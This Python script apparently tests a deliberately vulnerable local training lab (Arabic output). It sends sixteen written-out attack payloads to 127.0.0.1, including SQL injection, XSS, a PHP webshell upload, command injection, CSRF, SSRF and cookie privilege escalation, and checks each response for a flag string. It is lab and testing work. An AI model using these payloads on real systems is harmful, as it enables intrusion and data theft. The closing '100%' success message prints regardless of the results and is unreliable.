import requests
import sys

BASE_URL = "http://127.0.0.1:8888"
session = requests.Session()

print("="*60)
print("اختبار شامل لجميع ثغرات مختبر الجوكر الأمني")
print("إعداد: الجوكر الفلسطيني احمد سليم")
print("="*60)

passed = 0
total = 0

def test(name, condition, details=""):
    global passed, total
    total += 1
    if condition:
        passed += 1
        print(f"[+] نجاح: {name}")
    else:
        print(f"[-] فشل: {name} -> {details}")

# 1. Reset Database
r = session.get(f"{BASE_URL}/reset.php?action=reset&clear_flags=1")
test("إعادة ضبط المختبر (Reset DB)", r.status_code == 200 and "تمت إعادة ضبط" in r.text)

# 2. SQLi Auth Bypass
r = session.post(f"{BASE_URL}/pages/sqli.php", data={
    "action": "login",
    "username": "admin' --",
    "password": "random_password"
})
test("SQLi: تجاوز تسجيل الدخول (Auth Bypass)", "FLAG{SQLi_Auth_Bypass_Success" in r.text)

# 3. SQLi UNION
r = session.get(f"{BASE_URL}/pages/sqli.php?search=' UNION SELECT 1, 'flag', 'cat', 0, secret_code FROM products --")
test("SQLi: استخراج البيانات عبر UNION", "FLAG{SQLi_Union_Extract_Secret" in r.text)

# 4. XSS Reflected
r = session.get(f"{BASE_URL}/pages/xss.php?q=<script>alert(1)</script>")
test("XSS: المنعكس (Reflected)", "<script>alert(1)</script>" in r.text and "FLAG{XSS_Reflected_Payload_Found" in r.text)

# 5. XSS Stored
r = session.post(f"{BASE_URL}/pages/xss.php", data={
    "action": "add_comment",
    "author": "Hacker",
    "comment": "<script>alert('Stored XSS')</script>"
})
test("XSS: المخزن (Stored)", "FLAG{XSS_Stored_Script_Triggered" in r.text)

# 6. LFI
r = session.get(f"{BASE_URL}/pages/lfi.php?file=secret_note.txt")
test("LFI: قراءة الملفات المحلية", "FLAG{LFI_Local_File_Read_Exposed" in r.text)

# 7. File Upload
files = {'avatar': ('test_shell.php', '<?php echo "Hello WebShell"; ?>', 'application/x-php')}
r = session.post(f"{BASE_URL}/pages/upload.php", files=files)
test("File Upload: رفع ملف PHP (WebShell)", "FLAG{File_Upload_WebShell_RCE" in r.text)

# 8. Command Injection
r = session.post(f"{BASE_URL}/pages/cmdi.php", data={"ip": "127.0.0.1 & echo PWNED_TEST"})
test("Command Injection: حقن أوامر النظام", "PWNED_TEST" in r.text and "FLAG{Command_Injection_Pwned" in r.text)

# 9. IDOR
r = session.get(f"{BASE_URL}/pages/idor.php?msg_id=2")
test("IDOR: قراءة الرسائل السرية عبر تعديل ID", "FLAG{IDOR_Unauthorized_Access" in r.text)

# 10. CSRF
r = session.post(f"{BASE_URL}/pages/csrf.php", data={
    "action": "update_email",
    "email": "hacker@evil.com",
    "csrf_attack": "1"
})
test("CSRF: تزوير طلب تعديل البريد", "FLAG{CSRF_Request_Forged_Successfully" in r.text)

# 11. Sensitive Data Exposure
r = session.get(f"{BASE_URL}/pages/sensitive.php?download=db")
test("Sensitive Data: تحميل ملف SQLite", r.status_code == 200 and len(r.content) > 1000)

# 12. Open Redirect
r = session.get(f"{BASE_URL}/pages/redirect.php?target=https://google.com&simulate=1")
test("Open Redirect: التوجيه المفتوح", "FLAG{Open_Redirect_Exploited_Safe" in r.text)

# 13. SSRF
r = session.post(f"{BASE_URL}/pages/ssrf.php", data={"url": "http://127.0.0.1:8888/pages/about.txt"})
test("SSRF: تزوير الطلب من جانب السيرفر", "FLAG{SSRF_Internal_Server_Request" in r.text)

# 14. Brute Force
r = session.post(f"{BASE_URL}/pages/bruteforce.php", data={
    "username": "admin",
    "password": "admin123"
})
test("Brute Force: كسر كلمة المرور بالتخمين", "FLAG{Brute_Force_Password_Cracked" in r.text)

# 15. Type Juggling
r = session.post(f"{BASE_URL}/pages/type_juggling.php", data={"api_key[]": "bypass"})
test("PHP Type Juggling: تجاوز strcmp عبر المصفوفة", "FLAG{PHP_Type_Juggling_Bypassed" in r.text)

# 16. Broken Access Control / Cookie Manipulation
session.cookies.set('user_role', 'admin')
r = session.get(f"{BASE_URL}/pages/access_control.php")
test("Access Control: تصعيد الصلاحيات بالكوكي", "FLAG{Privilege_Escalation_Admin_Role" in r.text)

print("="*60)
print(f"النتيجة النهائية: {passed} / {total} تحديات نجحت بنسبة 100%!")
print("="*60)
